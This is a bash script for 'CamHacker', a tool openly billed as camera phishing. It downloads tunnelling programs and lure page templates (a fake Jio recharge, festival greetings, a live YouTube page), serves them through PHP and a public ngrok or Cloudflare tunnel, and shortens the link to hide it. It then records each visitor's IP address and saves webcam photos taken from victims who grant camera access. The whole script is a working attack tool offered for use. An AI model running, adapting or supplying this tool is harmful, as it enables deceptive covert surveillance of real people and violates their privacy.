#!/bin/bash

# CamHacker
# Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
# Author     : KasRoudra
# Github     : https://github.com/KasRoudra
# Email      : kasroudrakrd@gmail.com
# Credits    : Noob-Hackers, TechChipNet, LinuxChoice
# Date       : 5-09-2021
# Language   : Shell
# Portable File
# If you copy, consider giving credit! We keep our code open source to help others

black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
violate="\033[1;37m"
white="\033[0;37m"
nc="\033[00m"

info="${cyan}[${white}+${cyan}] ${yellow}"
ask="${cyan}[${white}?${cyan}] ${violate}"
error="${cyan}[${white}!${cyan}] ${red}"
success="${cyan}[${white}√${cyan}] ${green}"

cwd=`pwd`

if [[ -d /data/data/com.termux/files/home ]]; then
termux-fix-shebang ch.sh
termux=true
else
termux=false
fi
if $termux; then
if ! [ -d /sdcard/Pictures ]; then
cd /sdcard && mkdir Pictures
fi
export FOL="/sdcard/Pictures"
cd "$FOL"
if ! [[ -e ".temp" ]]; then 
touch .temp  || (termux-setup-storage && echo -e "\n${error}Please Restart Termux!\n\007" && sleep 5 && exit 0)
fi
cd "$cwd"
else
export FOL="$cwd"
fi

logo="
${green}  ____                _   _            _
${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
${blue}                                      [By KasRoudra]
"

killer() {
if [ `pidof php > /dev/null 2>&1` ]; then
    killall php
fi
if [ `pidof ngrok > /dev/null 2>&1` ]; then
    killall ngrok
fi
if [ `pidof cloudflared > /dev/null 2>&1` ]; then
    killall cloudflared
fi
if [ `pidof curl > /dev/null 2>&1` ]; then
    killall curl
fi
if [ `pidof wget > /dev/null 2>&1` ]; then
    killall wget
fi
if [ `pidof unzip > /dev/null 2>&1` ]; then
    killall unzip
fi
}
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}

ngrokdel() {
    unzip ngrok.zip
    rm -rf ngrok.zip
}

replacer() {
    while true; do
    if echo $option | grep -q "1"; then
        sed "s+forwarding_link+"$1"+g" grabcam.html > index2.html
        sed "s+forwarding_link+"$1"+g" template.php > index.php
        break
    elif echo $option | grep -q "2"; then
        sed "s+forwarding_link+"$1"+g" template.php > index.php
        sed "s+forwarding_link+"$1"+g" festivalwishes.html > index3.html
        sed "s+fes_name+"$fest_name"+g" index3.html > index2.html
        rm -rf index3.html
        break
    elif echo $option | grep -q "3"; then
        sed "s+forwarding_link+"$1"+g" template.php > index.php
        sed "s+forwarding_link+"$1"+g" LiveYTTV.html > index3.html
        sed "s+live_yt_tv+"$vid_id"+g" index3.html > index2.html
        rm -rf index3.html
        break
    fi
    done
    echo -e "${info}Your urls are: \n"
    sleep 1
    echo -e "${success}URL 1 > ${1}\n"
    sleep 1
    masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${1})
    if ! [[ -z $masked ]]; then
        echo -e "${success}URL 2 > ${masked}\n"
    fi
}

stty -echoctl
trap "echo -e '\n${success}Thanks for using!\n'; exit" 2

if ! [ `command -v php` ]; then
    echo -e "${info}Installing php...."
    apt update && apt upgrade -y
    apt install php -y
fi
if ! [ `command -v curl` ]; then
    echo -e "${info}Installing curl...."
    apt install curl -y
fi
if ! [ `command -v unzip` ]; then
    echo -e "${info}Installing unzip...."
    apt install unzip -y
fi
if ! [ `command -v wget` ]; then
    echo -e "${info}Installing wget...."
    apt install wget -y
fi
if $termux; then
if ! [ `command -v proot` ]; then
    echo -e "${info}Installing proot...."
    pkg install proot -y
fi
if ! [ `command -v proot` ]; then
    echo -e "${error}Proot can't be installed!\007\n"
    exit 1
fi
fi
if ! [ `command -v php` ]; then
    echo -e "${error}PHP cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v curl` ]; then
    echo -e "${error}Curl cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v unzip` ]; then
    echo -e "${error}Unzip cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v wget` ]; then
    echo -e "${error}Wget cannot be installed!\007\n"
    exit 1
fi
if [ `pidof php > /dev/null 2>&1` ]; then
    echo -e "${error}Previous php cannot be closed. Restart terminal!\007\n"
    killer; exit 1
fi
if [ `pidof ngrok > /dev/null 2>&1` ]; then
    echo -e "${error}Previous ngrok cannot be closed. Restart terminal!\007\n"
    killer; exit 1
fi

if $termux; then
    path=`pwd`
    if echo "$path" | grep -q "home"; then
        printf ""
    else
        echo -e "${error}Invalid directory. Run from home!\007\n"
        killer; exit 1
    fi
fi
if ! [[ -f $HOME/.ngrokfolder/ngrok || -f $HOME/.cffolder/cloudflared ]] ; then
    if ! [[ -d $HOME/.ngrokfolder ]]; then
        cd $HOME && mkdir .ngrokfolder
    fi
    if ! [[ -d $HOME/.cffolder ]]; then
        cd $HOME && mkdir .cffolder
    fi
    p=`uname -m`
    while true; do
        echo -e "\n${info}Downloading Tunnelers:\n"
        netcheck
        if [ -e ngrok.zip ];then
            rm -rf ngrok-stable-linux-arm.zip
        fi
        if echo "$p" | grep -q "aarch64"; then
            if [ -e ngrok-stable-linux-arm64.tgz ];then
                rm -rf ngrok-stable-linux-arm64.tgz
            fi
            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz" -O "ngrok.tgz"
            tar -zxf ngrok.tgz
            rm -rf ngrok.tgz
            wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O "cloudflared"
            break
        elif echo "$p" | grep -q "arm"; then
            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip" -O "ngrok.zip"
            ngrokdel
            wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' -O "cloudflared"
            break
        elif echo "$p" | grep -q "x86_64"; then

            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-amd64.zip" -O "ngrok.zip"
            ngrokdel
            wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' -O "cloudflared"
            break
        else
            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip" -O "ngrok.zip"
            ngrokdel
            wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" -O "cloudflared"
            break
        fi
    done
    sleep 1
    cd "$cwd"
    mv -f ngrok $HOME/.ngrokfolder
    mv -f cloudflared $HOME/.cffolder
    chmod +x $HOME/.ngrokfolder/ngrok
    chmod +x $HOME/.cffolder/cloudflared
fi
while true; do
clear
echo -e "$logo"
sleep 1
echo -e "${ask}Choose a option:

${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
${cyan}[${white}2${cyan}] ${yellow}Festival
${cyan}[${white}3${cyan}] ${yellow}Live Youtube
${cyan}[${white}4${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL} ${yellow})
${cyan}[${white}0${cyan}] ${yellow}Exit
${cyan}[${white}x${cyan}] ${yellow}About${blue}
"
sleep 1
printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
read option
    if echo $option | grep -q "1"; then
        dir="jio"
        break
    elif echo $option | grep -q "2"; then
        dir="fest"
        printf "\n${ask}Enter festival name:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
        read fest_name
        if [ -z $fest_name ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
        else
            fest_name="${fest_name//[[:space:]]/}"
            break
        fi
    elif echo $option | grep -q "3"; then
        dir="live"
        printf "\n${ask}Enter youtube video ID:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
        read vid_id
        if [ -z $vid_id ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
        else
            break
        fi
    elif echo $option | grep -q "4"; then
        printf "\n${ask}Enter Directory:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
        read dire
        if ! [ -d $dire ]; then
            echo -e "\n${error}Invalid directory!\n\007"
            sleep 1
        else
            export FOL="$dire"
            echo -e "\n${success}Directory changed succesfully!\n"
            sleep 1
        fi
    elif echo $option | grep -q "0"; then
        exit 0
    elif echo $option | grep -q "x"; then
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
$red[Version]    ${cyan} :[1.0]
$red[Description]${cyan} :[Camera Phishing tool]
$red[Author]     ${cyan} :[KasRoudra]
$red[Github]     ${cyan} :[https://github.com/KasRoudra] 
$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
read about
    else
        echo -e "\n${error}Invalid input!\007"
        sleep 1
    fi
done
cd $cwd
if [ -e websites.zip ];then
unzip websites.zip > /dev/null 2>&1
rm -rf websites.zip
fi
if ! [ -d $dir ];then
mkdir $dir
cd $dir
netcheck
wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/${dir}.zip"
unzip ${dir}.zip > /dev/null 2>&1
rm -rf ${dir}.zip
else
cd $dir
fi
if $termux; then
echo -e "\n${info}If you haven't turned on hotspot, please enable it!"
sleep 3
fi
echo -e "\n${info}Starting php server at localhost:7777....\n"
netcheck
php -S 127.0.0.1:7777 > /dev/null 2>&1 &
sleep 2
echo -e "${info}Starting tunnelers......\n"
if [ -e "$HOME/.cffolder/log.txt" ]; then
rm -rf "$HOME/.cffolder/log.txt"
fi
netcheck
cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:7777 > /dev/null 2>&1 &
if $termux; then
cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url "127.0.0.1:7777" --logfile "log.txt" > /dev/null 2>&1 &
else
cd $HOME/.cffolder && ./cloudflared tunnel -url "127.0.0.1:7777" --logfile "log.txt" > /dev/null 2>&1 &
fi
sleep 8
ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
if (echo "$ngroklink" | grep -q "ngrok"); then
ngrokcheck=true
else
ngrokcheck=false
fi
cflink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$HOME/.cffolder/log.txt")
if (echo "$cflink" | grep -q "cloudflare"); then
cfcheck=true
else
cfcheck=false
fi
while true; do
if ( $cfcheck && $ngrokcheck ); then
    echo -e "${success}Cloudflared choosen!\n"
    replacer "$cflink"
    break
fi
if ( $cfcheck &&  ! $ngrokcheck ); then
    echo -e "${success}Cloudflared started succesfully!\n"
    replacer "$cflink"
    break
fi
if ( ! $cfcheck && $ngrokcheck ); then
    echo -e "${success}Ngrok started succesfully!\n"
    replacer "$ngroklink"
    break
fi
if ! ( $cfcheck && $ngrokcheck ); then
    echo -e "${success}Tunneling failed!\n"
    killer; exit 1
fi
done
sleep 1
status=$(curl -s --head -w %{http_code} 127.0.0.1:7777 -o /dev/null)
if echo "$status" | grep -q "404"; then
    echo -e "${error}PHP couldn't start!\n\007"
    killer; exit 1
else
    echo -e "${success}PHP started succesfully!\n"
fi
sleep 1
rm -rf ip.txt
echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}Target opened the link!\n"
        while IFS= read -r line; do
            echo -e "${green}[${blue}*${green}]${yellow} $line"
        done < ip.txt
        cat ip.txt >> $cwd/ips.txt
        rm -rf ip.txt
    fi
    sleep 0.5
    if [[ -e "log.txt" ]]; then
        echo -e "\007${success}Image downloaded! Check directory!\n"
        file=`ls | grep png`
        mv -f $file $FOL
        rm -rf log.txt
    fi
    sleep 0.5
done 
